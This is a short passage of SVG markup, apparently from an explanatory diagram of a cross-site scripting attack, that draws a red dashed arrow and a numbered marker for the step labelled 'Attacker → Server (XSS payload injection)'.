  <!--  ARROWS                                                 -->
  <!-- ====================================================== -->

  <!-- Step 1: Attacker → Server (XSS payload injection) -->
  <path d="M 171 240 L 324 240" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)"/>
  <circle cx="248" cy="218" r="16" fill="#ef4444"/>
  <text x="248" y="223" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">1</text>

